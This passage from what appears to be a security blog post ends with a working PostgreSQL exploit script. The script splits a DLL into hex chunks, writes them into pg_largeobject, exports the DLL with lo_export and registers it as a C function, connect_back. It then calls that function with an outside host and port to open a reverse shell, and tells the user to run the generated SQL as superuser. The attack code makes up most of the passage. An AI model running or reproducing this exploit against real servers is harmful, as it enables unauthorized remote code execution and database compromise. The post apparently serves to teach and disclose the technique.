<span class="n">port</span> <span class="o">=</span> <span class="nf">int</span><span class="p">(</span><span class="n">sys</span><span class="p">.</span><span class="n">argv</span><span class="p">[</span><span class="mi">2</span><span class="p">])</span>
<span class="n">lib</span> <span class="o">=</span> <span class="n">sys</span><span class="p">.</span><span class="n">argv</span><span class="p">[</span><span class="mi">3</span><span class="p">]</span>
<span class="k">with</span> <span class="nf">open</span><span class="p">(</span><span class="n">lib</span><span class="p">,</span> <span class="sh">"</span><span class="s">rb</span><span class="sh">"</span><span class="p">)</span> <span class="k">as</span> <span class="n">dll</span><span class="p">:</span>
    <span class="n">d</span> <span class="o">=</span> <span class="n">dll</span><span class="p">.</span><span class="nf">read</span><span class="p">()</span>
<span class="n">sql</span> <span class="o">=</span> <span class="sh">"</span><span class="s">select lo_import(</span><span class="sh">'</span><span class="s">C:/Windows/win.ini</span><span class="sh">'</span><span class="s">, 1337);</span><span class="sh">"</span>
<span class="k">for</span> <span class="n">i</span> <span class="ow">in</span> <span class="nf">range</span><span class="p">(</span><span class="mi">0</span><span class="p">,</span> <span class="nf">len</span><span class="p">(</span><span class="n">d</span><span class="p">)</span><span class="o">//</span><span class="mi">2048</span><span class="p">):</span>
    <span class="n">start</span> <span class="o">=</span> <span class="n">i</span> <span class="o">*</span> <span class="mi">2048</span>
    <span class="n">end</span>   <span class="o">=</span> <span class="p">(</span><span class="n">i</span><span class="o">+</span><span class="mi">1</span><span class="p">)</span> <span class="o">*</span> <span class="mi">2048</span>
    <span class="k">if</span> <span class="n">i</span> <span class="o">==</span> <span class="mi">0</span><span class="p">:</span>
        <span class="n">sql</span> <span class="o">+=</span> <span class="sh">"</span><span class="s">update pg_largeobject set pageno=%d, data=decode(</span><span class="sh">'</span><span class="s">%s</span><span class="sh">'</span><span class="s">, </span><span class="sh">'</span><span class="s">hex</span><span class="sh">'</span><span class="s">) where loid=1337;</span><span class="sh">"</span> <span class="o">%</span> <span class="p">(</span><span class="n">i</span><span class="p">,</span> <span class="n">d</span><span class="p">[</span><span class="n">start</span><span class="p">:</span><span class="n">end</span><span class="p">].</span><span class="nf">hex</span><span class="p">())</span>
    <span class="k">else</span><span class="p">:</span>
        <span class="n">sql</span> <span class="o">+=</span> <span class="sh">"</span><span class="s">insert into pg_largeobject(loid, pageno, data) values (1337, %d, decode(</span><span class="sh">'</span><span class="s">%s</span><span class="sh">'</span><span class="s">, </span><span class="sh">'</span><span class="s">hex</span><span class="sh">'</span><span class="s">));</span><span class="sh">"</span> <span class="o">%</span> <span class="p">(</span><span class="n">i</span><span class="p">,</span> <span class="n">d</span><span class="p">[</span><span class="n">start</span><span class="p">:</span><span class="n">end</span><span class="p">].</span><span class="nf">hex</span><span class="p">())</span>
<span class="nf">if </span><span class="p">(</span><span class="nf">len</span><span class="p">(</span><span class="n">d</span><span class="p">)</span> <span class="o">%</span> <span class="mi">2048</span><span class="p">)</span> <span class="o">!=</span> <span class="mi">0</span><span class="p">:</span>
    <span class="n">end</span>   <span class="o">=</span> <span class="p">(</span><span class="n">i</span><span class="o">+</span><span class="mi">1</span><span class="p">)</span> <span class="o">*</span> <span class="mi">2048</span>
    <span class="n">sql</span> <span class="o">+=</span> <span class="sh">"</span><span class="s">insert into pg_largeobject(loid, pageno, data) values (1337, %d, decode(</span><span class="sh">'</span><span class="s">%s</span><span class="sh">'</span><span class="s">, </span><span class="sh">'</span><span class="s">hex</span><span class="sh">'</span><span class="s">));</span><span class="sh">"</span> <span class="o">%</span> <span class="p">((</span><span class="n">i</span><span class="o">+</span><span class="mi">1</span><span class="p">),</span> <span class="n">d</span><span class="p">[</span><span class="n">end</span><span class="p">:].</span><span class="nf">hex</span><span class="p">())</span>

<span class="n">sql</span> <span class="o">+=</span> <span class="sh">"</span><span class="s">select lo_export(1337, </span><span class="sh">'</span><span class="s">poc.dll</span><span class="sh">'</span><span class="s">);</span><span class="sh">"</span>
<span class="n">sql</span> <span class="o">+=</span> <span class="sh">"</span><span class="s">create function connect_back(text, integer) returns void as </span><span class="sh">'</span><span class="s">../data/poc</span><span class="sh">'</span><span class="s">, </span><span class="sh">'</span><span class="s">connect_back</span><span class="sh">'</span><span class="s"> language C strict;</span><span class="sh">"</span>
<span class="n">sql</span> <span class="o">+=</span> <span class="sh">"</span><span class="s">select connect_back(</span><span class="sh">'</span><span class="s">%s</span><span class="sh">'</span><span class="s">, %d);</span><span class="sh">"</span> <span class="o">%</span> <span class="p">(</span><span class="n">host</span><span class="p">,</span> <span class="n">port</span><span class="p">)</span>
<span class="nf">print</span><span class="p">(</span><span class="sh">"</span><span class="s">(+) building poc.sql file</span><span class="sh">"</span><span class="p">)</span>
<span class="k">with</span> <span class="nf">open</span><span class="p">(</span><span class="sh">"</span><span class="s">poc.sql</span><span class="sh">"</span><span class="p">,</span> <span class="sh">"</span><span class="s">w</span><span class="sh">"</span><span class="p">)</span> <span class="k">as</span> <span class="n">sqlfile</span><span class="p">:</span>
    <span class="n">sqlfile</span><span class="p">.</span><span class="nf">write</span><span class="p">(</span><span class="n">sql</span><span class="p">)</span>
<span class="nf">print</span><span class="p">(</span><span class="sh">"</span><span class="s">(+) run poc.sql in PostgreSQL using the superuser</span><span class="sh">"</span><span class="p">)</span>
<span class="nf">print</span><span class="p">(</span><span class="sh">"</span><span class="s">(+) for a db cleanup only, run the following sql:</span><span class="sh">"</span><span class="p">)</span>
<span class="nf">print</span><span class="p">(</span><span class="sh">"</span><span class="s">    select lo_unlink(l.oid) from pg_largeobject_metadata l;</span><span class="sh">"</span><span class="p">)</span>
<span class="nf">print</span><span class="p">(</span><span class="sh">"</span><span class="s">    drop function connect_back(text, integer);</span><span class="sh">"</span><span class="p">)</span>
</code></pre></div></div> <h2 id="references">References</h2> <ul> <li><a href="https://www.dionach.com/blog/postgresql-9-x-remote-command-execution/">https://www.dionach.com/blog/postgresql-9-x-remote-command-execution/</a></li> <li><a href="https://www.exploit-db.com/papers/13084">https://www.exploit-db.com/papers/13084</a></li> </ul> </article> </div> </div> </div> </div> <footer class="sticky-bottom mt-5" role="contentinfo"> <div class="container"> &copy; Copyright 2025 47z!Lu7h . Love is life. And if you miss love, you miss life. </div> </footer> <script src="https://cdn.jsdelivr.net/npm/jquery@3.6.0/dist/jquery.min.js" integrity="sha256-/xUj+3OJU5yExlq6GSYGSHk7tPXikynS7ogEvDej/m4=" crossorigin="anonymous"></script> <script src="/assets/js/bootstrap.bundle.min.js"></script> <script src="https://cdn.jsdelivr.net/npm/mdbootstrap@4.20.0/js/mdb.min.js" integrity="sha256-NdbiivsvWt7VYCt6hYNT3h/th9vSTL4EDWeGs5SN3DA=" crossorigin="anonymous"></script> <script defer src="https://cdn.jsdelivr.net/npm/masonry-layout@4.2.2/dist/masonry.pkgd.min.js" integrity="sha256-Nn1q/fx0H7SNLZMQ5Hw5JLaTRZp0yILA/FRexe19VdI=" crossorigin="anonymous"></script> <script defer src="https://cdn.jsdelivr.net/npm/imagesloaded@4/imagesloaded.pkgd.min.js"></script> <script defer src="/assets/js/masonry.js" type="text/javascript"></script> <script defer src="https://cdn.jsdelivr.net/npm/medium-zoom@1.1.0/dist/medium-zoom.min.js" integrity="sha256-ZgMyDAIYDYGxbcpJcfUnYwNevG/xi9OHKaR/8GK+jWc=" crossorigin="anonymous"></script> <script defer src="/assets/js/zoom.js?85ddb88934d28b74e78031fd54cf8308"></script> <script defer src="/assets/js/bootstrap-toc.min.js?c82ff4de8b0955d6ff14f5b05eed7eb6"></script> <script src="/assets/js/no_defer.js?2930004b8d7fcd0a8e00fdcfc8fc9f24"></script> <script defer src="/assets/js/common.js?4a129fbf39254905f505c7246e641eaf"></script> <script defer src="/assets/js/copy_code.js?12775fdf7f95e901d7119054556e495f" type="text/javascript"></script> <script async src="https://d1bxh8uas1mnw7.cloudfront.net/assets/embed.js"></script> <script async src="https://badge.dimensions.ai/badge.js"></script> <script type="text/javascript">window.MathJax={tex:{tags:"ams"}};</script> <script defer type="text/javascript" id="MathJax-script" src="https://cdn.jsdelivr.net/npm/mathjax@3.2.0/es5/tex-mml-chtml.js"></script> <script defer src="https://polyfill.io/v3/polyfill.min.js?features=es6"></script> <script type="text/javascript">function progressBarSetup(){"max"in document.createElement("progress")?(initializeProgressElement(),$(document).on("scroll",function(){progressBar.attr({value:getCurrentScrollPosition()})}),$(window).on("resize",initializeProgressElement)):(resizeProgressBar(),$(document).on("scroll",resizeProgressBar),$(window).on("resize",resizeProgressBar))}function getCurrentScrollPosition(){return $(window).scrollTop()}function initializeProgressElement(){let e=$("#navbar").outerHeight(!0);$("body").css({"padding-top":e}),$("progress-container").css({"padding-top":e}),progressBar.css({top:e}),progressBar.attr({max:getDistanceToScroll(),value:getCurrentScrollPosition()})}function getDistanceToScroll(){return $(document).height()-$(window).height()}function resizeProgressBar(){progressBar.css({width:getWidthPercentage()+"%"})}function getWidthPercentage(){return getCurrentScrollPosition()/getDistanceToScroll()*100}const progressBar=$("#progress");window.onload=function(){setTimeout(progressBarSetup,50)};</script> </body> </html>